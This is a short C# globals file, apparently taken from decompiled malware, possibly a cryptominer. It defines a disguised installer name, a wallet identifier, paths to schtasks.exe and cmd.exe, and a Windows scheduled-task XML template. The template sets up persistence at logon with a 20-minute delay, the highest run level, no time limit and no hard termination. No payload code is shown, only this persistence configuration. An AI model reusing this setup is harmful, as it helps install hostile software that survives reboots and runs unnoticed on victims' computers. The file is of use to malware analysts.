using System;
using System.IO;

internal class Globals
{
	public static string currentDirectory = "";

	public static string originalApplicationFileName = "setup_soma.bin";

	public static string walletId = "overbtc123.";

	public static string schtasksPath = Path.Combine(Environment.SystemDirectory, "schtasks.exe");

	public static string cmdPath = Path.Combine(Environment.SystemDirectory, "cmd.exe");

	public static string taskConfigXml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n  <RegistrationInfo>\r\n  </RegistrationInfo>\r\n  <Triggers>\r\n    <LogonTrigger>\r\n<StartBoundary>{0}</StartBoundary>\r\n      <Enabled>true</Enabled>\r\n      <Delay>PT20M</Delay>\r\n    </LogonTrigger>\r\n  </Triggers>\r\n  <Principals>\r\n    <Principal id=\"Author\">\r\n      <LogonType>InteractiveToken</LogonType>\r\n      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n  <Settings>\r\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\r\n    <AllowHardTerminate>false</AllowHardTerminate>\r\n    <StartWhenAvailable>true</StartWhenAvailable>\r\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n    <IdleSettings>\r\n      <StopOnIdleEnd>true</StopOnIdleEnd>\r\n      <RestartOnIdle>false</RestartOnIdle>\r\n    </IdleSettings>\r\n    <AllowStartOnDemand>true</AllowStartOnDemand>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n    <WakeToRun>false</WakeToRun>\r\n    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n    <Priority>7</Priority>\r\n  </Settings>\r\n  <Actions Context=\"Author\">\r\n    <Exec>\r\n      <Command>\"{1}\"</Command>\r\n      <WorkingDirectory>{2}</WorkingDirectory>\r\n<Arguments>{3}</Arguments>\r\n    </Exec>\r\n  </Actions>\r\n</Task>";
}
